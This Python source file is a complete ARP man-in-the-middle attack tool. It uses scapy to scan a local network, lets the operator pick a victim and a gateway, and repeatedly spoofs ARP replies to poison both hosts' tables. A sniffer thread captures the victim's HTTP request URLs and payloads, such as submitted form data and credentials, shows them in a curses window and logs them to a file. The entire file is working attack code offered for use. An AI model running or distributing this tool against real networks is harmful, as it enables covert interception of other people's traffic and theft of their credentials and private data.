import scapy.all as scapy
from scapy.layers import http
from ipaddress import ip_address, ip_network
from datetime import datetime as dt
import time
from csv import DictWriter
from pathlib import Path
import threading
import curses

import logging
import sys
logging.getLogger("scapy").setLevel(1)
logging.basicConfig(stream=sys.stdout, level=logging.INFO)

# Control keys
CTRL_POS_Y = 6
KEY_EXIT = "[CTRL-C] Exit"
KEY_WRITELOG = "[CTRL-W] Write packet log to file"
KEY_CLEARLOG = "[CTRL-L] Clear log"
KEY_MACREFRESH = "[CTRL-R] Resolve MAC addresses"
KEY_DIV = " | "

# Control signals in ASCII decimal
CTRL_EXIT = 3 # CTRL-C
CTRL_WRITELOG = 23 # CTRL-W
CTRL_MACRESOLVE = 18 # CTRL-R
CTRL_CLEARLOG = 12 # CTRL-L
NOTIFICATION_TIMEOUT = 6 # used to clear notification messages

MAXLOGSIZE = 20 * 1024 * 1024
PACKET_LOG_FILE = 'packetlog.txt'

# ARP spoofing function
# sends an ARP reply packet to target IP, masqerading as spoof IP
def arp_spoof(target_ip, spoof_ip, target_mac):

	# create an ARP reply packet with spoofed IP values
	arp_reply_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
	# send it
	scapy.send(arp_reply_packet, verbose=False)

# ARP table restore function
def arp_restore(target_ip, gw_ip):
	# get target and gateway host MAC address
	
	dst_mac = get_mac(target_ip)
	src_mac = get_mac(gw_ip)

	# create an ARP reply packet with real values of target and gateway MAC addresses
	arp_reply_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=dst_mac, psrc=gw_ip, hwsrc=src_mac)
	# send it
	scapy.send(arp_reply_packet, verbose=False)

# helper function, get MAC address for a given target IP
def get_mac(ip,force_refresh=False):
	global arp_status_window
	arp_status_window.border()
	
	
	# if MAC address is in cache
	if get_mac.mac_list.get(ip) != None and not force_refresh:
		# if time in cache is under 5 minutes, return MAC	
		if int(time.time()) - get_mac.mac_list[ip]['time'] < (60 * 5):
			return get_mac.mac_list[ip]['mac']
		# if time limit exceeded, remove old MAC and continue resolution
		else:
			get_mac.mac_list.pop(ip)
			
	arp_rq = scapy.ARP(pdst=ip)
	# create Ethernet frame
	broadcast = scapy.Ether(dst="FF:FF:FF:FF:FF:FF")
	arp_rq_broadcast = broadcast/arp_rq
	# send packet and store replies
	i = 0
	arp_status_window.timeout(1000)	# amount of time to wait for control commands between each loop
	while True:
		info = "ARP STATUS"
		arp_status_window.addstr(1,1,info)
		try:
			# send an ARP broadcast
			answered, unanswered = scapy.srp(arp_rq_broadcast, timeout=1, verbose=False)
			
			# if we catch CTRL-C, abort program
			if arp_status_window.getch() == CTRL_EXIT:
				raise KeyboardInterrupt
				
			
			# add resolved address to cache and return MAC address of target host
			get_mac.mac_list[ip] = {'mac' : answered[0][1].hwsrc, 'time' : int(time.time()) }
			return get_mac.mac_list[ip]['mac']
			
		# if no answer, send broadcast until we get one
		except IndexError:
		
			# write message to window
			info = "[!] ARP broadcast: no reply, retrying...{}".format(i)
			# arp_status_window.move(3,1)
			# arp_status_window.clrtoeol()
			arp_status_window.addstr(3,1,info)
			arp_status_window.refresh()
			i += 1
			continue

		# show abort message and clean up
		except KeyboardInterrupt:
			info = " [+] CTRL-C hit"
			arp_window_cleanup(info, arpspoof_running=False)

def window_controls(ctrl_char):
	
	global arp_status_window
	
	# if we catch CTRL-C, abort program
	if  ctrl_char == CTRL_EXIT:
		arp_status_window.addstr(CTRL_POS_Y,2,KEY_EXIT, curses.A_REVERSE)
		arp_status_window.refresh()
		curses.napms(500)
		raise KeyboardInterrupt

	# if we catch w, write HTTP packets to logfile
	elif ctrl_char == CTRL_WRITELOG:
	
		# highlight key momentarily
		arp_status_window.addstr(CTRL_POS_Y,2+len(KEY_EXIT)+len(KEY_DIV),KEY_WRITELOG, curses.A_REVERSE)
		arp_status_window.refresh()
		
		# if log data exists and can be written, display this (errors are handled in log_packet)
		if log_packet(writelog=True) == True:
			notification = "(HTTP packet capture data written to logfile {})".format(PACKET_LOG_FILE)

		# if no log data, display this
		else:
			notification = "(No HTTP packets to write to log)"

	elif ctrl_char == CTRL_MACRESOLVE:
		arp_status_window.addstr(CTRL_POS_Y,2+len(KEY_EXIT)+len(KEY_DIV)*3+len(KEY_WRITELOG)+len(KEY_CLEARLOG),KEY_MACREFRESH, curses.A_REVERSE)
		arp_status_window.refresh()
		target_mac = get_mac(target_ip,force_refresh=True)
		gw_mac = get_mac(gw_ip,force_refresh=True)
		notification = "(Resolving MAC addresses...)"
		
	elif ctrl_char == CTRL_CLEARLOG:
		arp_status_window.addstr(CTRL_POS_Y,2+len(KEY_EXIT)+len(KEY_DIV)*2+len(KEY_WRITELOG),KEY_CLEARLOG, curses.A_REVERSE)
		arp_status_window.refresh()
		log_packet(clearlog=True)
		notification = "(Log cleared)"

	# if no key was pressed, do nothing
	else:
		notification = None
		

	return True, notification
	
			
def arp_mitm(target_ip, gw_ip):
	global arp_status_window
	i = 0 # packet counter
	
	global KEY_EXIT
	global KEY_WRITELOG
	global KEY_CLEARLOG
	global KEY_MACREFRESH
	global KEY_DIV

			
	# MITM ARP spoofing
	try:

		# get target host MAC address
		target_mac = get_mac(target_ip)
		gw_mac = get_mac(gw_ip)
		arp_status_window.timeout(1500)	# how long getch will wait for a ctrl character
		notification = "" # messages to display for commands
		notification_timer = 0
		while True:
			info = "ARP STATUS"
			arp_status_window.addstr(1,1,info)
			info = "[+] Spoofing ARP tables for target {} and gateway {}".format(target_ip, gw_ip,)
			arp_status_window.addstr(2,2,info)
			arp_spoof(target_ip, gw_ip, gw_mac)	# overwrite target machine ARP table 
			arp_spoof(gw_ip, target_ip, target_mac)# overwrite gateway's ARP table
			i += 2
			info = "[+] ARP Packets sent: {}".format(i)
			arp_status_window.clrtoeol()
			arp_status_window.addstr(3,2,info)
			
			# write out control keys to display
			arp_status_window.addstr(CTRL_POS_Y,2,KEY_EXIT)
			arp_status_window.addstr(CTRL_POS_Y,2+len(KEY_EXIT),KEY_DIV)
			arp_status_window.addstr(CTRL_POS_Y,2+len(KEY_EXIT)+len(KEY_DIV),KEY_WRITELOG)
			arp_status_window.addstr(CTRL_POS_Y,2+len(KEY_EXIT)+len(KEY_DIV)+len(KEY_WRITELOG),KEY_DIV)
			arp_status_window.addstr(CTRL_POS_Y,2+len(KEY_EXIT)+len(KEY_DIV)*2+len(KEY_WRITELOG),KEY_CLEARLOG)
			arp_status_window.addstr(CTRL_POS_Y,2+len(KEY_EXIT)+len(KEY_DIV)*2+len(KEY_WRITELOG)+len(KEY_CLEARLOG),KEY_DIV)
			arp_status_window.addstr(CTRL_POS_Y,2+len(KEY_EXIT)+len(KEY_DIV)*3+len(KEY_WRITELOG)+len(KEY_CLEARLOG),KEY_MACREFRESH)
			arp_status_window.addstr(CTRL_POS_Y-1,2,notification)
			arp_status_window.clrtoeol()
			arp_status_window.border()
			arp_status_window.refresh()
			
			# capture user input
			ctrl_char = arp_status_window.getch()
			
			# process control and set notification message if necessary
			(flag, msg) = window_controls(ctrl_char)

			if flag == True and msg is not None:
				notification = msg
				notification_timer = i # set the notification message countdown
			curses.napms(500)

			
			# when loop has passed enough times, erase notification messages
			if i - notification_timer > NOTIFICATION_TIMEOUT:
				arp_status_window.move(CTRL_POS_Y-1,2)
				arp_status_window.clrtoeol()
				notification = ""
			curses.flushinp() # flush any buffered input
			

	# show abort message and clean up
	except KeyboardInterrupt:
		info = " [+] CTRL-C hit, restoring target and gateway ARP tables..."
		arp_window_cleanup(info)
		
# scan a range of IPs and return IP/MAC address for live hosts
# iprange is an IP range in CIDR notation eg '10.0.0.0/24'
def macscan(iprange):
	arp_rq = scapy.ARP(pdst=iprange)
	# create Ethernet frame
	broadcast = scapy.Ether(dst="FF:FF:FF:FF:FF:FF")
	arp_rq_broadcast = broadcast/arp_rq
	# send packet and store replies
	answered, unanswered = scapy.srp(arp_rq_broadcast, timeout=1, verbose=False)
	
	# return IP/MAC addresses of hosts that reply
	host_list = []
	for idx, host in enumerate(answered):
		host_dict = {'idx': idx+1, 'ip' : host[1].psrc, 'mac' : host[1].hwsrc}
		host_list.append(host_dict)
	return host_list
		

# restore ARP tables if necessary, show exit messages and exit
def arp_window_cleanup(status_message,arpspoof_running=True):
	global arp_status_window
	arp_status_window.erase()
	info = "ARP STATUS\n"
	arp_status_window.addstr(1,1,info)
	info = status_message
	arp_status_window.addstr(2,1,info)
	arp_status_window.border()
	arp_status_window.refresh()
	
	# if ARP spoof is currently running, restore tables on target and gateway
	if arpspoof_running == True:
		arp_restore(target_ip, gw_ip)
	
	info = " [+] Exiting"
	arp_status_window.addstr(3,1,info)
	arp_status_window.refresh()	
	curses.napms(2000)
	curses.endwin()
	print("[+] Exited")
	exit()
	
def select_target(netiface_mac):

	# get the network range we want to scan for targets and gateway
	while True:
		iprange = input("[*] Enter an IPv4 network range to scan in CIDR format: ")
		# check if network range is valid (CIDR format)
		try:
			ip_network(iprange)
		# if not, ask again
		except ValueError:
			print("\n[!] Invalid IPv4 network range, re-enter...")
			continue
		
		# scan the network range, if nothing found, ask for a new one
		activehosts = macscan(iprange)
		if activehosts == []:
			print("\n[!] No hosts found in network range, enter a new one...")
		else:
			break


	# spit out results
	print('\n{:>4}IP{:18}MAC Address\n----------------------------------------------------------------'.format("",""))
	for host in activehosts:
		# highlight the probable gateway (ending in .1), highlight the attacker's own IP
		notify = ""

		if host['ip'].split(".")[3] == "1":
			notify = "(Probable gateway)"
		if host['mac'] == netiface_mac:
			notify += "(local IP address)"
		print("[{}] {:20}{} {}".format(host['idx'], host['ip'], host['mac'], notify))
	print("\n")


	target_ip = None
	gw_ip = None
	# ask user to select target from list provided
	while True:
		target_ip_idx = input("[*] Select number of host to target: ")

		for host in activehosts:
			if target_ip_idx == str(host['idx']):
				target_ip = host['ip']
				break
		# catch invalid selection
		if target_ip == None:
			print("\n[!] Invalid selection, re-enter...")
			continue
		

		# ask user to select gateway from list provided
		gw_ip_idx = input("[*] Select number of gateway: ")

		for host in activehosts:
			if gw_ip_idx == str(host['idx']):
				gw_ip = host['ip']
				break
		# catch invalid selection
		if gw_ip == None:
			print("\n[!] Invalid selection, re-enter...")
			continue
			
		return target_ip, gw_ip

def select_interface():

	# get the interface name to run MITM attack on
	selected_iface = None
	while True:
		print("\n{:>4}Interface{:41}MAC Address\n{}".format("","","-"*75))
		interface_list = scapy.get_windows_if_list()
		for count,iface in enumerate(interface_list):
			iface.update({'idx' : count+1})
			print("[{}] {:50}{}".format(iface['idx'], iface['name'], iface['mac']))
		
		selection = input("\n[*] Select a network interface for ARP spoofing: ")

		for iface in interface_list:
			if selection == str(iface['idx']):
				selected_iface = [ iface['name'], iface['mac'] ]
				print("[+] Interface {} ({}) selected".format(iface['name'],iface['mac']))
				return selected_iface
				
		# catch invalid selection
		if selected_iface  == None:
			print("\n[!] Invalid selection, re-enter...")
			continue

	
	
def sniff(interface):
	# sniff for HTTP traffic on selected interface, call process function on each hit
	scapy.sniff(filter="port 80 and host "+target_ip, iface=interface, store=False, prn=process_packet)
	
def process_packet(packet):
	global sniffer_window

	# if detects information being sent to server, console log the details
	if packet.haslayer(http.HTTPRequest) and packet.haslayer(scapy.Raw):
		packet_data = { 'timestamp' : str(dt.now()), 'src_ip' : target_ip, 'url' : packet[http.HTTPRequest].Host.decode()+packet[http.HTTPRequest].Path.decode(), 'payload' : packet[scapy.Raw].load.decode() }
		
		info = "\n [+] [{}] packet detected\n".format(packet_data['timestamp'])
		info += "{:>5}[SOURCE_IP] {}\n".format("", packet_data['src_ip'])
		info += "{:>5}[URL] http://{}\n".format("", packet_data['url'])
		info += "{:>5}[DATA] {}".format("", packet_data['payload'])
		sniffer_window.addstr(info)
		sniffer_window.border()
		sniffer_window.refresh()

		# store packet in memory
		log_packet(packet_data=packet_data)

def log_packet(packet_data=None, writelog=False, clearlog=False):

	global sniffer_window
		
	# write current log out to file
	if writelog == True and len(log_packet.packetlist) > 0:
		try:
			with open(PACKET_LOG_FILE, 'a', newline='') as csvfile:
				
				fields = list(log_packet.packetlist[0].keys()) # take the header from the first log's key names
				writer = DictWriter(csvfile, fieldnames=fields)
				
				# if file is being opened for first time write CSV header
				if Path(PACKET_LOG_FILE).stat().st_size == 0:
					writer.writeheader()
					
				for packet in log_packet.packetlist:
					writer.writerow(packet)
			
		except IOError:
			print("[!] Error writing log data to file {}".format(PACKET_LOG_FILE))
			arp_window_cleanup("ARP STATUS\n  [!] Error writing log data to file {}".format(PACKET_LOG_FILE))
			
		#print(log_packet.packetlist)
		log_packet.packetlist = [] # reset packet log in memory
		curses.flash() # flash the screen to indicate file written
		return True
	
	elif clearlog == True:
		sniffer_window.erase()
		log_packet.packetlist = []
		# see note about setting newlines in this text and using setscrreg() in display_monitor_window()
		info = "HTTP REQUEST PACKET SNIFFER\n\n"
		sniffer_window.addstr(1,1,info)
		sniffer_window.border()
		sniffer_window.refresh()
		curses.flash() # flash the screen to indicate memory log cleared
		return True
		
	# erase existing log in memory if it gets too big
	if log_packet.packetlist.__sizeof__() > MAXLOGSIZE:
		log_packet.packetlist = []
	
	# store packet in memory
	if packet_data is not None:
		log_packet.packetlist.append(packet_data)
		return True
	return False
	



def display_monitor_windows(stdscr):	
	# lines, columns, start line, start column
	height,width = stdscr.getmaxyx()
	curses.curs_set(0)
	global arp_status_window
	
	arp_status_window = curses.newwin(8,width,0, 0)
	arp_status_window.border()


	
	global sniffer_window
	sniffer_window = curses.newwin(height-8,width,8, 0)
	info = "HTTP REQUEST PACKET SNIFFER\n\n"
	sniffer_window.addstr(1,1,info)	
	
	# set the scrollable area of packet sniffer window
	sniffer_window.scrollok(True)
	# NOTE: these values are very finnicky and related to the number of newlines in the HTTP REQUEST PACKET SNIFFER string - first value in particular 
	sniffer_window.setscrreg(3,sniffer_window.getmaxyx()[0]-3)	
	sniffer_window.border()

	arpspoof_thread = threading.Thread(target=arp_mitm, args=(target_ip, gw_ip), daemon=True)
	arpspoof_thread.start()
	
	sniffer_window.refresh()
	sniffer_thread = threading.Thread(target=sniff, args=([netiface[0]]), daemon=True)
	sniffer_thread.start()
	
	while arpspoof_thread.is_alive():
		time.sleep(1)
		
# a pseudo static variable for the logging function
log_packet.packetlist = []

# pseudo static variable to hold resolved MAC addresses
get_mac.mac_list = {}

print("ARP MITM ATTACK TOOL")
netiface = select_interface()
target_ip, gw_ip = select_target(netiface[1])

curses.wrapper(display_monitor_windows)
exit()




